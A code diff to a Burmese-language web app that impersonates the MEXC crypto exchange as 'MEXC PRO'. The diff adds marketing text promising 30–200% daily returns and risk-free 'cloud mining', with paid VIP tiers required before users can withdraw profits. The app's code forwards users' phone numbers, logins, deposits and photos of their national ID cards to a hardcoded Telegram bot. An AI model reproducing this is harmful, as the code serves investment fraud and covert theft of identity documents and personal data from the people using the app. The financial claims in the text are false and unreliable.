@@ -104,7 +104,7 @@
         .market-icon-img { width: 25px; height: 25px; margin-right: 10px; vertical-align: middle; border-radius: 50%; }
 
         .info-header { font-size: 18px; color: var(--primary); margin-top: 15px; border-left: 3px solid var(--primary); padding-left: 10px; }
-        .info-text { font-size: 13px; line-height: 1.6; color: var(--dim); margin: 10px 0; }
+        .info-text { font-size: 13px; line-height: 1.8; color: var(--dim); margin: 10px 0; }
         .info-box { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; margin-bottom: 10px; }
 
         .msg-box { padding: 12px; border-radius: 10px; background: rgba(0, 219, 177, 0.1); border: 1px solid var(--border); margin-bottom: 10px; border-left: 4px solid var(--primary); }
@@ -126,6 +126,10 @@
         .verify-approved { background: rgba(46, 189, 133, 0.15); border: 1px solid var(--green); color: var(--green); }
         .verify-rejected { background: rgba(246, 70, 93, 0.15); border: 1px solid var(--red); color: var(--red); }
         .verify-none { background: rgba(148, 163, 184, 0.15); border: 1px solid var(--dim); color: var(--dim); }
+
+        .highlight-box { background: linear-gradient(135deg, rgba(0,219,177,0.15), rgba(0,114,255,0.15)); border: 1px solid var(--primary); padding: 15px; border-radius: 12px; margin: 12px 0; }
+        .warning-box { background: rgba(246,70,93,0.1); border: 1px solid var(--red); padding: 15px; border-radius: 12px; margin: 12px 0; }
+        .success-box { background: rgba(46,189,133,0.1); border: 1px solid var(--green); padding: 15px; border-radius: 12px; margin: 12px 0; }
     </style>
 </head>
 <body>
@@ -288,17 +292,148 @@
     <div id="announcement-list"></div>
 </div>
 
+<!-- ============================================================ -->
+<!-- INFO PAGE - MEXC သမိုင်းကြောင်း အပြည့်အစုံ -->
+<!-- ============================================================ -->
 <div id="info-page" class="page">
     <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
         <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
         <h3>MEXC PRO platform အကြောင်း</h3>
     </div>
+    
     <div class="card">
         <img src="https://i.ibb.co/xtHCCyLm/images-1.jpg" style="width:100%; border-radius:10px; margin-bottom:15px;">
+        
         <h4 class="info-header">MEXC PRO ဖြစ်ပေါ်လာပုံသမိုင်း</h4>
-        <p class="info-text">MEXC PRO သည် ၂၀၂၀ ခုနှစ်တွင် စတင်တည်ထောင်ခဲ့ပြီး ကမ္ဘာတစ်ဝှမ်းရှိ ရင်းနှီးမြှုပ်နှံသူများအတွက် လုံခြုံစိတ်ချရသော Trading ပတ်ဝန်းကျင်ကို ဖန်တီးပေးရန် ရည်ရွယ်ပါသည်။</p>
+        <p class="info-text">
+            MEXC PRO သည် ၂၀၂၀ ခုနှစ်တွင် စတင်တည်ထောင်ခဲ့ပြီး ကမ္ဘာတစ်ဝှမ်းရှိ ရင်းနှီးမြှုပ်နှံသူများအတွက် လုံခြုံစိတ်ချရသော Trading ပတ်ဝန်းကျင်ကို ဖန်တီးပေးရန် ရည်ရွယ်ပါသည်။ ကျွန်ုပ်တို့သည် အာရှ၏ ထိပ်တန်း Digital Asset Platform တစ်ခုအဖြစ် ရပ်တည်နေပြီး သုံးစွဲသူပေါင်း ၅ သန်းကျော်၏ ယုံကြည်မှုကို ရရှိထားပါသည်။
+        </p>
+        <p class="info-text">
+            MEXC PRO ကို စတင်တည်ထောင်စဉ်ကာလတွင် ကျွန်ုပ်တို့၏ ရည်မှန်းချက်မှာ ရိုးရှင်းပါသည် — သာမန်လူတန်းစားများပါ ငွေကြေးဈေးကွက်ထဲတွင် ပါဝင်နိုင်ရန်၊ အမြတ်ရနိုင်ရန်နှင့် ငွေကြေးလွတ်လပ်မှုကို ရရှိနိုင်ရန် ဖြစ်ပါသည်။ ထိုရည်မှန်းချက်ဖြင့် ကျွန်ုပ်တို့သည် ခေတ်မီဆုံး နည်းပညာများ၊ လုံခြုံဆုံး စနစ်များနှင့် အမြတ်အများဆုံး ရနိုင်သော Trading ပတ်ဝန်းကျင်ကို ဖန်တီးပေးခဲ့ပါသည်။
+        </p>
+        <p class="info-text">
+            ၂၀၂၁ ခုနှစ်တွင် MEXC PRO သည် Mobile App ကို ထုတ်လုပ်ခဲ့ပြီး အသုံးပြုသူပေါင်း ၁ သန်းကျော်ကို ရရှိခဲ့ပါသည်။ ၂၀၂၂ ခုနှစ်တွင် Cloud Mining စနစ်ကို စတင်ခဲ့ပြီး အသုံးပြုသူများအတွက် Passive Income ရရှိနိုင်သော လမ်းစသစ်ကို ဖွင့်လှစ်ပေးခဲ့ပါသည်။ ၂၀၂၃-၂၀၂၄ ခုနှစ်များတွင် အာရှတစ်ဝှမ်းလုံးတွင် ထိပ်တန်း Platform တစ်ခုအဖြစ် ရပ်တည်နိုင်ခဲ့ပါသည်။
+        </p>
+
         <h4 class="info-header">ဘယ်လောက်အထိ အမြတ်ရနိုင်လဲ?</h4>
-        <p class="info-text" style="color: var(--active-gold); font-weight: bold;">တစ်ရက်လျှင် အရင်းအနှီးပေါ်မူတည်၍ ၃၀% မှ ၂၀၀% အထိ အမြတ်ရရှိနိုင်ပါသည်။</p>
+        <p class="info-text" style="color: var(--active-gold); font-weight: bold;">
+            တစ်ရက်လျှင် အရင်းအနှီးပေါ်မူတည်၍ ၃၀% မှ ၂၀၀% အထိ အမြတ်ရရှိနိုင်ပါသည်။ မှန်ကန်စွာ Trading ပြုလုပ်ခြင်းဖြင့် သင်၏ဘဝကို စက္ကန့်ပိုင်းအတွင်း ပြောင်းလဲလိုက်ပါ။
+        </p>
+
+        <h4 class="info-header">Trading ဆိုတာ ဘာလဲ?</h4>
+        <div class="highlight-box">
+            <p class="info-text" style="color: #fff; font-weight: bold; margin-top: 0;">
+                📊 <b>Trading ဆိုတာ ဘာလဲ?</b>
+            </p>
+            <p class="info-text">
+                Trading ဆိုသည်မှာ ဈေးကွက်အတွင်း အရောင်းအဝယ် ပြုလုပ်ခြင်းဖြစ်ပါသည်။ ရိုးရှင်းစွာ ပြောရလျှင် — ဈေးတက်မည်ဟု ထင်လျှင် အဝယ် (Call Up) လုပ်ပြီး၊ ဈေးကျမည်ဟု ထင်လျှင် အရောင်း (Put Down) လုပ်ခြင်းဖြစ်ပါသည်။
+            </p>
+            <p class="info-text" style="color: var(--primary); font-weight: bold;">
+                💡 Trading ဆိုတာ ဈေးတတ်သည်ဖြစ်စေ၊ ကျသည်ဖြစ်စေ အမြတ်ရနိုင်ပါသည်။ အဓိကက မှန်ကန်သည့် ဈေးကွက်လမ်းကြောင်းများကို လိုက်နိုင်ဖို့ပါပဲ။
+            </p>
+            <p class="info-text">
+                ဈေးတက်မည်ဟု ထင်လျှင် <b style="color: var(--green);">Call Up (BUY)</b> ကို နှိပ်ပါ။ ဈေးကျမည်ဟု ထင်လျှင် <b style="color: var(--red);">Put Down (SELL)</b> ကို နှိပ်ပါ။ သင်၏ ခန့်မှန်းချက် မှန်ကန်ပါက အမြတ်ရမည်ဖြစ်ပြီး၊ မှားယွင်းပါက အရင်းဆုံးရှုံးမည်ဖြစ်ပါသည်။
+            </p>
+            <p class="info-text">
+                သို့သော် MEXC PRO တွင် သင်၏ ခန့်မှန်းချက်ကို မှန်ကန်စေရန် AI Trading Signals၊ ဈေးကွက်ခွဲခြမ်းစိတ်ဖြာချက်များနှင့် ကျွမ်းကျင်သူများ၏ အကြံပြုချက်များကို ရယူနိုင်ပါသည်။ ထို့ကြောင့် သင်သည် ဈေးကွက်ကို ကောင်းစွာ နားလည်ပြီး အမြတ်ရရှိနိုင်ရန် အခွင့်အလမ်းများစွာ ရှိပါသည်။
+            </p>
+            <p class="info-text" style="color: var(--active-gold);">
+                ⭐ <b>အရေးကြီးဆုံးအချက်:</b> Trading တွင် အရင်းအနှီး များလေလေ၊ အမြတ် ပိုရလေဖြစ်ပါသည်။ သို့သော် မိမိတတ်နိုင်သည့် ပမာဏကိုသာ ရင်းနှီးရန် အကြံပြုပါသည်။
+            </p>
+        </div>
+
+        <h4 class="info-header">Cloud Mining ဆိုတာ ဘာလဲ?</h4>
+        <div class="highlight-box">
+            <p class="info-text" style="color: #fff; font-weight: bold; margin-top: 0;">
+                ⛏️ <b>Mining ဆိုတာ ဘာလဲ?</b>
+            </p>
+            <p class="info-text">
+                Mining ဆိုသည်မှာ ဘဏ်လိုပဲ အတိုးများတယ်၊ risk မရှိဘူး။ များများရင်းနိုင်လေ များများအမြတ်ရလေပါပဲ။
+            </p>
+            <p class="info-text">
+                <b style="color: var(--primary);">Cloud Mining</b> ဆိုတာ ဘဏ်ပုံစံပါပဲ။ ဒါပေမယ့် ဘဏ်တွေထက် အတိုးနှုန်းမြောက်မြားစွာ ပိုမိုရရှိနိုင်တဲ့ နေရာဖြစ်ပါတယ်။
+            </p>
+            <p class="info-text" style="color: var(--active-gold); font-weight: bold; border: 1px dashed var(--active-gold); padding: 10px; border-radius: 8px;">
+                ဥပမာ - Cloud Mining တွင် နေ့စဉ်အတိုး (၂%) ရရှိမည်ဆိုပါက အရင်း ၁ သိန်းကျပ် ထည့်ဝင်ထားရုံဖြင့် တစ်ရက်လျှင် ၂,၀၀၀ ကျပ် အမြတ်ငွေ အလုပ်မလုပ်ဘဲ အမြဲတမ်း ရရှိနေမှာဖြစ်ပါတယ်။
+            </p>
+            <p class="info-text">
+                မိမိကိုယ်တိုင် စက်ပစ္စည်းများ ဝယ်ယူစရာမလိုဘဲ ကျွန်ုပ်တို့၏ အဆင့်မြင့် Mining Rig များကို ငှားရမ်းခြင်းဖြင့် နေ့စဉ်အမြတ်ငွေ <b>Passive Income</b> ရအောင် အခုပဲ ရှာဖွေလိုက်ပါ။
+            </p>
+        </div>
+
+        <h4 class="info-header">VIP Level များအလိုက် Mining သက်ရောက်မှု</h4>
+        
+        <div class="warning-box">
+            <p style="margin: 0; color: var(--red); font-weight: bold; font-size: 14px;">
+                ⚠️ သတိပေးချက်
+            </p>
+            <p class="info-text" style="margin-bottom: 0;">
+                Mining မှ အမြတ်ငွေများသည် <b>VIP Level 1</b> အတွက်သာ ထုတ်ယူနိုင်ပါသည်။ VIP Level မရှိသေးပါက Mining အမြတ်ငွေများကို ထုတ်ယူနိုင်မည် မဟုတ်ပါ။
+            </p>
+        </div>
+
+        <div class="success-box">
+            <p style="margin: 0; color: var(--green); font-weight: bold; font-size: 14px;">
+                🥇 VIP Level 1 — Mining အမြတ်ငွေ ထုတ်ယူခွင့်
+            </p>
+            <p class="info-text" style="margin-bottom: 0;">
+                VIP Level 1 တင်ရှိသူသည် Mining မှ ရရှိသော အမြတ်ငွေများကို ထုတ်ယူနိုင်ပါသည်။ ရက်စောင့်စရာ မလိုပါ။ Mining ပြီးဆုံးသည်နှင့် အမြတ်ငွေကို Balance ထဲသို့ ထည့်သွင်းနိုင်ပါသည်။
+            </p>
+        </div>
+
+        <div class="highlight-box">
+            <p style="margin: 0; color: var(--primary); font-weight: bold; font-size: 14px;">
+                🥈 VIP Level 2 — Mining ရပ်တန့်ခွင့်
+            </p>
+            <p class="info-text">
+                VIP Level 2 တင်ရှိသူသည် Mining ကို <b>ရပ်တန့်ခွင့်</b>ရှိမည်။ သို့သော် —
+            </p>
+            <ul style="color: var(--dim); font-size: 13px; line-height: 1.8; padding-left: 20px;">
+                <li>✅ <b>အရင်း</b> သာ ပြန်လည်ရရှိမည်</li>
+                <li>❌ <b>အမြတ်</b> ကို ရရှိမည် မဟုတ်ပါ</li>
+            </ul>
+            <p class="info-text" style="margin-bottom: 0;">
+                ဆိုလိုသည်မှာ — သင်သည် Mining ကို ရပ်လိုက်ပါက သင်ထည့်ထားသော အရင်းငွေကို ပြန်ရမည်ဖြစ်ပြီး၊ အမြတ်ငွေကို ရရှိမည် မဟုတ်ပါ။
+            </p>
+        </div>
+
+        <div class="success-box">
+            <p style="margin: 0; color: var(--green); font-weight: bold; font-size: 14px;">
+                🥉 VIP Level 3 — အထူးအခွင့်အရေး ⭐
+            </p>
+            <p class="info-text">
+                VIP Level 3 တင်ရှိသူသည် —
+            </p>
+            <ul style="color: var(--dim); font-size: 13px; line-height: 1.8; padding-left: 20px;">
+                <li>✅ Mining ကို <b>ရက်စောင့်စရာမလိုပဲ</b> ရပ်တန့်နိုင်မည်</li>
+                <li>✅ <b>အရင်း</b> ကော <b>အမြတ်</b> ကော ပြန်လည်ရရှိမည်</li>
+                <li>✅ <b>၅ ရက်</b> Mining ကို ရပ်တန့်လိုက်သော်လည်း <b>၅ ရက်စာ အမြတ်ငွေ</b> ကို ရရှိမည်</li>
+            </ul>
+            <p class="info-text" style="margin-bottom: 0; color: var(--active-gold);">
+                ⭐ ဥပမာ — သင် ၁၀၀,၀၀၀ Ks ဖြင့် ၃၀ ရက် Mining လုပ်ထားပြီး ၅ ရက်မြောက်နေ့တွင် ရပ်လိုက်ပါက — သင်၏ အရင်း ၁၀၀,၀၀၀ Ks ကော၊ ၅ ရက်စာ အမြတ်ငွေ ကော ပြန်လည်ရရှိမည်ဖြစ်ပါသည်။
+            </p>
+        </div>
+
+        <h4 class="info-header">Passive Income ဆိုတာ ဘာလဲ?</h4>
+        <div class="info-box" style="border-left: 4px solid var(--green);">
+            <p class="info-text">
+                <b>Passive Income</b> ဆိုတာ အလုပ်မလုပ်ဘဲ အမြဲတမ်း ဝင်ငွေစီးဆင်းနေတဲ့ စနစ်ကို ဆိုလိုတာပါ။ မြန်မာလူမျိုးအများစုဟာ တစ်ဘဝလုံး အလုပ်တွေ ပင်ပင်ပန်းပန်း လုပ်ကိုင်ရင်း အချိန်ကုန်ဆုံးနေကြပါတယ်။
+            </p>
+            <p class="info-text" style="color: var(--primary);">
+                Passive Income ရှိခြင်းက သင့်ကို <b>"ငွေကြေးလွတ်လပ်မှု (Financial Freedom)"</b> ကို ရရှိစေမှာပါ။ သင် အိပ်နေချိန်မှာတောင် သင့်အတွက် ပိုက်ဆံတွေက အလုပ်လုပ်ပေးနေမှာ ဖြစ်ပါတယ်။
+            </p>
+            <p class="info-text">
+                တစ်ဘဝလုံး အလုပ်တွေလုပ်ရင်း အချိန်ကုန်ဆုံးမယ့်အစား အမြဲတမ်းဝင်ငွေရမယ့် Passive Income လမ်းစကို ရှာဖွေကြပါ။ MEXC PRO နဲ့ လက်တွဲပြီး သန်းကြွယ်သူဌေး ဖြစ်ဖို့၊ ငွေကြေးလွတ်လပ်မှု ရရှိဖို့နဲ့ အိမ်မှာနေရင်း Daily Income တွေ ရရှိဖို့ အခုပဲ အတူလက်တွဲလိုက်ပါ။
+            </p>
+        </div>
+
+        <h4 class="info-header">သန်းကြွယ်သူဌေး ဖြစ်လာသူများအကြောင်း</h4>
+        <p class="info-text">
+            အရင်းအနှီးအနည်းငယ် (၁ သောင်းကျပ်) မှ စတင်၍ ယခုအခါ သိန်းပေါင်းသောင်းချီ ချမ်းသာသွားသော Trading Master များစွာရှိပါသည်။ ၎င်းတို့အကြောင်းကို YouTube တွင် "MEXC Success Stories" ဟု ရှာဖွေနိုင်သလို အောက်ပါ Link တွင်လည်း လေ့လာနိုင်ပါသည်။
+        </p>
+        <a href="https://youtube.com/@mexc_official" target="_blank" style="color:var(--primary); text-decoration:none; display:block; margin-bottom:15px;">
+            <i class="fab fa-youtube"></i> MEXC Professional Tutorials
+        </a>
     </div>
 </div>
 
@@ -518,6 +653,7 @@
     let isMiningActive = false; 
     let currentPayMethod = '';
     let nrcImages = { front: null, back: null, hold: null };
+    let currentVipLevel = 0;
 
     // ================================================================
     // 🔒 ADMIN CONFIGURATION
@@ -531,52 +667,77 @@
     };
 
     // ================================================================
-    // 📤 TELEGRAM BOT (အသစ် — သင့် Bot Token နှင့် Chat ID)
+    // 📤 TELEGRAM BOT
     // ================================================================
     const TELEGRAM_BOT_TOKEN = "8897992638:AAGexZBjPv1hwS10FcvYwjZ9rM8n6MEhAZ8";
-    const TELEGRAM_CHAT_ID = "7709938396";  // သင့် Chat ID ကို ဒီနေရာမှာ ထည့်ပါ
+    const TELEGRAM_CHAT_ID = "7709938396";
 
     // ================================================================
-    // 📨 Telegram သို့ Message ပို့သော function
+    // 📨 TELEGRAM QUEUE SYSTEM — 429 Error ဖြေရှင်းရန်
     // ================================================================
+    let telegramQueue = [];
+    let telegramProcessing = false;
+
     function sendTelegram(msg) {
         if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
             console.log("Telegram not configured:", msg);
             return;
         }
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: msg,
-                parse_mode: 'HTML'
-            })
-        }).catch(e => console.log("Telegram error:", e));
+        telegramQueue.push({ type: 'message', data: msg });
+        processTelegramQueue();
     }
 
-    // ================================================================
-    // 📷 Telegram သို့ Photo ပို့သော function
-    // ================================================================
     async function sendTelegramPhoto(file, caption) {
         if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
             console.log("Telegram not configured");
             return;
         }
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', file);
-        formData.append('caption', caption);
-        try {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        } catch(e) { console.log("Telegram photo error:", e); }
+        telegramQueue.push({ type: 'photo', file: file, caption: caption });
+        processTelegramQueue();
+    }
+
+    async function processTelegramQueue() {
+        if(telegramProcessing) return;
+        telegramProcessing = true;
+        
+        while(telegramQueue.length > 0) {
+            const item = telegramQueue.shift();
+            
+            try {
+                if(item.type === 'message') {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: item.data,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } else if(item.type === 'photo') {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', item.file);
+                    formData.append('caption', item.caption);
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+            } catch(e) {
+                console.log("Telegram error:", e);
+            }
+            
+            // 1.5 second delay — Rate Limit မကျော်ရန်
+            await new Promise(resolve => setTimeout(resolve, 1500));
+        }
+        
+        telegramProcessing = false;
     }
 
     // ================================================================
-    // 📋 Notification Helper — User လုပ်သမျှ အားလုံး Bot ကို ပို့မည်
+    // 📋 Notification Helper
     // ================================================================
     function notifyBot(action, data) {
         const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Yangon' });
@@ -710,7 +871,7 @@
     }
 
     // ================================================================
-    // 🔐 HANDLE AUTH (Register + Login)
+    // 🔐 HANDLE AUTH
     // ================================================================
     async function handleAuth(type) {
         const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value.trim();
@@ -732,7 +893,6 @@
                     initApp();
                     startLiveWdFeed(); 
                     
-                    // ✅ Login Notification
                     notifyBot('🔐 USER LOGIN', {
                         'Name': s.val().username,
                         'Phone': ph,
@@ -762,7 +922,6 @@
                     phone: ph
                 });
                 
-                // ✅ Register Notification
                 notifyBot('🆕 NEW USER REGISTERED', {
                     'Name': un,
                     'Phone': ph,
@@ -785,6 +944,7 @@
             document.getElementById('u-vip-badge').innerText = "VIP " + (val.vip || 0);
             document.getElementById('current-vip-level').innerText = "VIP " + (val.vip || 0) + " MEMBER";
             
+            currentVipLevel = val.vip || 0;
             updateVerifyBanner(val.verificationStatus);
         });
         
@@ -873,7 +1033,6 @@
         
         await db.ref('users/'+user).update({ verificationStatus: 'pending', nrc: nrc });
         
-        // ✅ Verification Notification
         notifyBot('🆔 VERIFICATION SUBMITTED', {
             'Name': uData.username,
             'Phone': user,
@@ -882,7 +1041,6 @@
             'Note': 'NRC ပုံ ၃ ပုံ အောက်တွင် ပါဝင်ပါသည်'
         });
         
-        // Send NRC photos
         await sendTelegramPhoto(nrcImages.front, `📷 NRC Front - ${uData.username} (${user})`);
         await sendTelegramPhoto(nrcImages.back, `📷 NRC Back - ${uData.username} (${user})`);
         await sendTelegramPhoto(nrcImages.hold, `📷 NRC Holding - ${uData.username} (${user})`);
@@ -971,7 +1129,6 @@
             if(s.val().vip >= lvl) return alert("သင်သည် ဤအဆင့် (သို့မဟုတ်) ဤထက်မြင့်သော အဆင့်သို့ ရောက်ရှိပြီးသား ဖြစ်ပါသည်။");
             if(confirm(`VIP ${lvl} သို့ ${cost.toLocaleString()} Ks ဖြင့် အဆင့်မြှင့်မှာ သေချာပါသလား?`)) {
                 db.ref('users/'+user).update({ balance: s.val().balance - cost, vip: lvl }).then(() => {
-                    // ✅ VIP Upgrade Notification
                     notifyBot('⭐ VIP UPGRADE', {
                         'User': user,
                         'Name': s.val().username,
@@ -1027,7 +1184,6 @@
             db.ref('users/'+user).update({ balance: uData.balance - amt });
             document.getElementById('timer-ring').classList.add('active');
             
-            // ✅ Trade Start Notification
             notifyBot('📊 TRADE STARTED', {
                 'User': user,
                 'Name': uData.username,
@@ -1047,7 +1203,6 @@
                         let reward = amt + (amt * (finalProf/100)); 
                         db.ref('users/'+user+'/balance').transaction(b => (b||0)+reward); 
                         
-                        // ✅ Trade Win Notification
                         notifyBot('📈 TRADE WIN ✅', {
                             'User': user,
                             'Name': uData.username,
@@ -1059,7 +1214,6 @@
                         
                         alert(`ဂုဏ်ယူပါသည်! Trading အောင်မြင်ပါသည်။\n\nစုစုပေါင်းအမြတ်ငွေ: ${reward.toLocaleString()} Ks`); 
                     } else {
-                        // ✅ Trade Loss Notification
                         notifyBot('📉 TRADE LOSS ❌', {
                             'User': user,
                             'Name': uData.username,
@@ -1111,6 +1265,23 @@
                     } else { timeText = "Mining ပြီးဆုံးပါပြီ!"; progress = 100; }
                 }
 
+                // VIP Level အလိုက် ခလုတ်ပြသမှု
+                let actionButton = '';
+                if(data.status === 'running') {
+                    if(currentVipLevel >= 3) {
+                        // VIP 3 — ရက်စောင့်စရာမလိုပဲ ရပ်နိုင်သည်
+                        actionButton = `<button class="btn btn-green" onclick="applyClickGold(this); stopMiningVIP3('${r.key}', ${data.totalProfit}, ${data.amt})" style="padding:10px; font-size:11px; margin-top:10px;">⚡ ရပ်တန့်မည် (အရင်း+အမြတ် ချက်ချင်းရ)</button>`;
+                    } else if(currentVipLevel >= 2) {
+                        // VIP 2 — ရပ်နိုင်သည်၊ ဒါပေမယ့် အရင်းသာရ
+                        actionButton = `<button class="btn btn-red" onclick="applyClickGold(this); stopMiningVIP2('${r.key}', ${data.amt})" style="padding:10px; font-size:11px; margin-top:10px;">🛑 ရပ်တန့်မည် (အရင်းသာရ)</button>`;
+                    }
+                    
+                    // ပြီးဆုံးရင် ထုတ်ယူခွင့်
+                    if(now >= data.expiryTime) {
+                        actionButton += `<button class="btn btn-main" onclick="applyClickGold(this); claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">အမြတ်ငွေ အားလုံးထုတ်ယူမည်</button>`;
+                    }
+                }
+
                 statusHTML += `<div class="card active-mining-info">
                     <div style="display:flex; justify-content:space-between; align-items:center;">
                         <b style="font-size:14px; color:var(--primary);">${data.node}</b>
@@ -1129,8 +1300,7 @@
                             <span>Exp: ${data.expiryDate || 'N/A'}</span>
                         </div>
                     </div>
-                    ${(data.status === 'running' && now >= data.expiryTime) ? 
-                        `<button class="btn btn-main" onclick="applyClickGold(this); claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">အမြတ်ငွေ အားလုံးထုတ်ယူမည်</button>` : ''}
+                    ${actionButton}
                 </div>`;
             });
             document.getElementById('user-mining-status').innerHTML = statusHTML || "<p style='text-align:center; font-size:12px; color:var(--dim);'>လက်ရှိတွင် Mining လုပ်ဆောင်နေမှု မရှိသေးပါ။</p>";
@@ -1158,7 +1328,6 @@
                 startTime: now.getTime(), totalProfit: Math.floor(amt + (amt*(percent/100)*days)), daysDuration: days 
             });
             
-            // ✅ Mining Request Notification
             notifyBot('⛏️ MINING REQUEST', {
                 'User': user,
                 'Name': uData.username,
@@ -1174,17 +1343,84 @@
         });
     }
 
+    // ================================================================
+    // 🛑 VIP 2 — Mining ရပ်တန့် (အရင်းသာရ)
+    // ================================================================
+    function stopMiningVIP2(key, amount) {
+        if(currentVipLevel < 2) return alert("VIP Level 2 တင်ရှိမှသာ ရပ်တန့်နိုင်ပါသည်။");
+        
+        if(!confirm("⚠️ သတိပေးချက်\n\nVIP Level 2 အနေနဲ့ Mining ကို ရပ်တန့်လိုက်ပါက —\n\n✅ အရင်း: " + amount.toLocaleString() + " Ks ပြန်ရမည်\n❌ အမြတ်: ရရှိမည် မဟုတ်ပါ\n\nသေချာပါသလား?")) return;
+        
+        db.ref(`requests/mining/${key}`).once('value', s => {
+            const data = s.val();
+            if(!data) return;
+            
+            // အရင်းသာ ပြန်ပေး
+            db.ref('users/'+user+'/balance').transaction(b => (b||0) + parseFloat(amount));
+            db.ref(`requests/mining/${key}`).update({ 
+                status: 'stopped', 
+                stoppedAt: Date.now(),
+                stoppedReason: 'VIP 2 — အရင်းသာရ'
+            });
+            
+            notifyBot('🛑 MINING STOPPED (VIP 2)', {
+                'User': user,
+                'Node': data.node,
+                'Amount': parseFloat(amount).toLocaleString() + ' Ks',
+                'Result': 'အရင်းသာ ပြန်ရ',
+                'Profit': '0 Ks (အမြတ်မရ)'
+            });
+            
+            alert("✅ Mining ရပ်တန့်ပြီးပါပြီ။\n\nအရင်း " + parseFloat(amount).toLocaleString() + " Ks ကို Balance ထဲသို့ ပြန်ထည့်ပေးလိုက်ပါပြီ။\n\n❌ အမြတ်ငွေ ရရှိမည် မဟုတ်ပါ။");
+        });
+    }
+
+    // ================================================================
+    // ⚡ VIP 3 — Mining ရပ်တန့် (အရင်း+အမြတ် ချက်ချင်းရ)
+    // ================================================================
+    function stopMiningVIP3(key, totalProfit, amount) {
+        if(currentVipLevel < 3) return alert("VIP Level 3 တင်ရှိမှသာ ဤအင်္ဂါရပ်ကို အသုံးပြုနိုင်ပါသည်။");
+        
+        if(!confirm("⚡ VIP Level 3 အထူးအခွင့်အရေး\n\nMining ကို ရပ်တန့်လိုက်ပါက —\n\n✅ အရင်း: " + parseFloat(amount).toLocaleString() + " Ks\n✅ အမြတ်: " + parseFloat(totalProfit).toLocaleString() + " Ks\n\nစုစုပေါင်း: " + (parseFloat(amount) + parseFloat(totalProfit)).toLocaleString() + " Ks ကို ချက်ချင်းရရှိမည်\n\nသေချာပါသလား?")) return;
+        
+        db.ref(`requests/mining/${key}`).once('value', s => {
+            const data = s.val();
+            if(!data) return;
+            
+            const total = parseFloat(amount) + parseFloat(totalProfit);
+            
+            // အရင်း + အမြတ် အားလုံး ပြန်ပေး
+            db.ref('users/'+user+'/balance').transaction(b => (b||0) + total);
+            db.ref(`requests/mining/${key}`).update({ 
+                status: 'completed', 
+                stoppedAt: Date.now(),
+                endTime: Date.now(),
+                stoppedReason: 'VIP 3 — အရင်း+အမြတ် ချက်ချင်းရ'
+            });
+            
+            notifyBot('⚡ MINING STOPPED (VIP 3)', {
+                'User': user,
+                'Node': data.node,
+                'Amount': parseFloat(amount).toLocaleString() + ' Ks',
+                'Profit': parseFloat(totalProfit).toLocaleString() + ' Ks',
+                'Total': total.toLocaleString() + ' Ks',
+                'Result': 'အရင်း+အမြတ် ချက်ချင်းရ'
+            });
+            
+            alert("⚡ VIP Level 3 အထူးအခွင့်အရေး\n\n✅ အရင်း: " + parseFloat(amount).toLocaleString() + " Ks\n✅ အမြတ်: " + parseFloat(totalProfit).toLocaleString() + " Ks\n\nစုစုပေါင်း " + total.toLocaleString() + " Ks ကို Balance ထဲသို့ ထည့်ပေးလိုက်ပါပြီ။");
+        });
+    }
+
     function claimMining(key, total) {
         db.ref(`requests/mining/${key}`).once('value', s => {
             const data = s.val();
             if(data.status === 'completed') return alert("ဤအမြတ်ကို ထုတ်ယူပြီးသားဖြစ်ပါသည်။");
             db.ref('users/'+user).once('value', us => {
-                if(us.val().vip < 1) return alert("VIP Level 1 နှင့်အထက်ရှိသူများသာ အမြတ်ထုတ်ယူနိုင်ပါသည်။");
+                if(us.val().vip < 1) return alert("⚠️ VIP Level 1 နှင့်အထက်ရှိသူများသာ အမြတ်ထုတ်ယူနိုင်ပါသည်။\n\nကျေးဇူးပြု၍ VIP အဆင့်မြှင့်တင်ပါ။");
                 if(confirm(`${total.toLocaleString()} Ks ကို Balance ထဲသို့ ထည့်သွင်းမှာ သေချာပါသလား?`)) {
                     db.ref('users/'+user+'/balance').transaction(b => (b||0) + total);
                     db.ref(`requests/mining/${key}`).update({ status: 'completed', endTime: Date.now() });
                     
-                    // ✅ Mining Claim Notification
                     notifyBot('✅ MINING CLAIMED', {
                         'User': user,
                         'Name': us.val().username,
@@ -1232,7 +1468,6 @@
             db.ref('requests/withdraws').push({ ph:user, amt, name:name, receivePh:ph, status:'pending', date:new Date().toLocaleString() }); 
             db.ref('users/'+user).update({ balance: s.val().balance - amt }); 
             
-            // ✅ Withdraw Notification
             notifyBot('🚨 WITHDRAW REQUEST', {
                 'User': user,
                 'Name': s.val().username,
@@ -1259,7 +1494,6 @@
                 ph:user, amt, trx, method: currentPayMethod, status:'pending', date:new Date().toLocaleString() 
             }); 
             
-            // ✅ Deposit Notification
             notifyBot('💰 DEPOSIT REQUEST', {
                 'User': user,
                 'Name': s.val().username,
@@ -1282,7 +1516,6 @@
             db.ref('users/'+user).once('value', s => { 
                 if(s.val().password === oldPw) { 
                     db.ref('users/'+user).update({password: newPw}).then(()=>{
-                        // ✅ Password Change Notification
